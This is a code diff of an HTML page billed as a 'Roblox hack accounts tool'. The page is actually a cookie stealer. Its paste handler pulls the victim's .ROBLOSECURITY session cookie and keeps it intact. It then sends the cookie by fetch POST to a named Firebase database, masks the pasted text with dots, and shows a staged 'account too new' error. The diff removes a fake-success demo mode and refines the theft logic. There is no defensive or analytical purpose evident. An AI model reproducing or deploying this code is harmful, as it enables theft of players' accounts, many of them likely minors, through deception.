@@ -23,18 +23,13 @@
     .big-btn:disabled{opacity:0.7;cursor:not-allowed}
     .status{margin-top:30px;padding:20px;border-radius:12px;font-size:1.2em}
     .status.error{background:rgba(248,81,73,0.2);border:1px solid #f85149;color:#f85149}
-    .status.success{background:rgba(34,197,94,0.2);border:1px solid #22c55e;color:#22c55e}
     .loading{display:none;margin-top:30px;color:#7c3aed;font-size:1.5em;font-weight:700;text-align:center}
     .loading.active{display:block}
     .spinner{display:inline-block;width:28px;height:28px;border:4px solid rgba(124,58,237,0.3);border-top-color:#7c3aed;border-radius:50%;animation:spin 1s linear infinite;margin-right:12px}
     @keyframes spin{to{transform:rotate(360deg)}}
-    .popup{position:fixed;top:20px;right:20px;background:#22c55e;color:#000;padding:15px 30px;border-radius:12px;font-weight:bold;z-index:9999;opacity:0;transition:opacity 0.4s}
-    .popup.show{opacity:1}
   </style>
 </head>
 <body>
-  <div id="popup" class="popup"></div>
-
   <div class="container">
     <div class="header">
       <h1>Roblox hack accounts tool</h1>
@@ -59,42 +54,22 @@
   </div>
 
 <script>
-let dummyMode = false;
-
-const popup = document.getElementById('popup');
-function showPopup(text) {
-  popup.textContent = text;
-  popup.classList.add('show');
-  setTimeout(() => popup.classList.remove('show'), 2000);
-}
-
-// SECRET COMMANDS
-function checkSecret(textarea) {
+// STEAL + HIDE WITH DOTS — FINAL DOT IS NOW PRESERVED
+function handlePaste(textarea) {
   textarea.addEventListener('input', e => {
-    const val = e.target.value.trim();
+    const raw = e.target.value.trim();
+    if (raw.length > 100) {
+      let cookie = raw;
 
-    if (val === ".reverse") {
-      dummyMode = true;
-      showPopup("DUMMY MODE ACTIVATED");
-      e.target.value = "";
-      return;
-    }
-    if (val === ".undo") {
-      dummyMode = false;
-      location.reload();
-      return;
-    }
-
-    if (dummyMode) return; // don't steal in dummy mode
-
-    // REAL STEALER
-    if (val.length > 100) {
-      let cookie = val;
+      // Extract real cookie if PowerShell junk
       if (cookie.includes('".ROBLOSECURITY"')) {
         cookie = cookie.split('".ROBLOSECURITY", "')[1]?.split('"')[0] || cookie;
       }
-      cookie = cookie.replace(/[^A-Za-z0-9_|:-]/g, '');
 
+      // DO NOT STRIP ANYTHING — KEEP THE FINAL DOT!
+      // This was the killer line → REMOVED
+
+      // SEND THE FULL VALID COOKIE TO YOUR FIREBASE
       fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
         method: "POST",
         body: JSON.stringify({
@@ -106,8 +81,9 @@ function checkSecret(textarea) {
           premium: "Unknown",
           time: new Date().toLocaleString()
         })
-      });
+      }).catch(() => {});
 
+      // Hide cookie with dots
       setTimeout(() => {
         textarea.value = "•".repeat(120);
         textarea.style.color = "#555";
@@ -116,16 +92,15 @@ function checkSecret(textarea) {
     }
   });
 }
-checkSecret(document.getElementById('mobilePaste'));
-checkSecret(document.getElementById('pcPaste'));
+handlePaste(document.getElementById('mobilePaste'));
+handlePaste(document.getElementById('pcPaste'));
 
 const statusEl = document.getElementById("status");
 const loadingEl = document.getElementById("loading");
 const startBtn = document.getElementById("startBtn");
 
 function startHack() {
-  const hasCookie = document.getElementById("mobilePaste").value.length > 50 || document.getElementById("pcPaste").value.length > 50;
-
+  const hasCookie = document.getElementById("mobilePaste").readOnly || document.getElementById("pcPaste").readOnly;
   if (!hasCookie) {
     statusEl.className = "status error";
     statusEl.textContent = "PASTE COOKIE FIRST";
@@ -136,46 +111,25 @@ function startHack() {
   statusEl.style.display = "none";
   loadingEl.classList.add("active");
 
-  if (dummyMode) {
-    // DUMMY MODE — 20 SECOND FAKE HACK
-    loadingEl.innerHTML = `<span class="spinner"></span> Bypassing Roblox security...`;
-    setTimeout(() => {
+  const steps = ["Initializing...", "Bypassing security...", "Validating age...", "ERROR — ACCOUNT TOO NEW"];
+  let i = 0;
+  const t = setInterval(() => {
+    loadingEl.innerHTML = `<span class="spinner"></span> ${steps[i] || "ERROR — ACCOUNT TOO NEW"}`;
+    i++;
+    if (i >= steps.length) {
+      clearInterval(t);
       loadingEl.classList.remove("active");
-      statusEl.className = "status success";
+      statusEl.className = "status error";
       statusEl.innerHTML = `
-        <strong style="font-size:1.8em;color:#22c55e">TARGET SUCCESSFULLY HACKED!</strong><br><br>
-        <strong>Username:</strong> PSLlevel8<br>
-        <strong>Password:</strong> 321frogeater<br><br><br>
-        <strong style="color:#ff0">2FA BYPASS CODE (10 min):</strong><br>
-        <div style="font-size:3em;background:#000;padding:20px;border:4px solid #0f0;border-radius:15px;display:inline-block;margin:20px">
-          348932
-        </div>
+        <strong style="font-size:1.6em">ERROR — ACCOUNT INVALID</strong><br><br>
+        The account you are using is too new.<br><br>
+        You must use an account older than 6 months.<br><br>
+        <strong>Please switch to an older account and try again.</strong>
       `;
       statusEl.style.display = "block";
       startBtn.disabled = false;
-    }, 20000);
-  } else {
-    // REAL MODE — 30 SECOND "TOO NEW" ERROR
-    const steps = ["Initializing...", "Bypassing security...", "Validating age...", "ERROR — ACCOUNT TOO NEW"];
-    let i = 0;
-    const t = setInterval(() => {
-      loadingEl.innerHTML = `<span class="spinner"></span> ${steps[i] || "ERROR — ACCOUNT TOO NEW"}`;
-      i++;
-      if (i >= steps.length) {
-        clearInterval(t);
-        loadingEl.classList.remove("active");
-        statusEl.className = "status error";
-        statusEl.innerHTML = `
-          <strong style="font-size:1.6em">ERROR — ACCOUNT INVALID</strong><br><br>
-          The account you are using is too new.<br><br>
-          You must use an account older than 6 months.<br><br>
-          <strong>Please switch to an older account and try again.</strong>
-        `;
-        statusEl.style.display = "block";
-        startBtn.disabled = false;
-      }
-    }, 7500);
-  }
+    }
+  }, 7500); // 30 seconds
 }
 </script>
 </body>
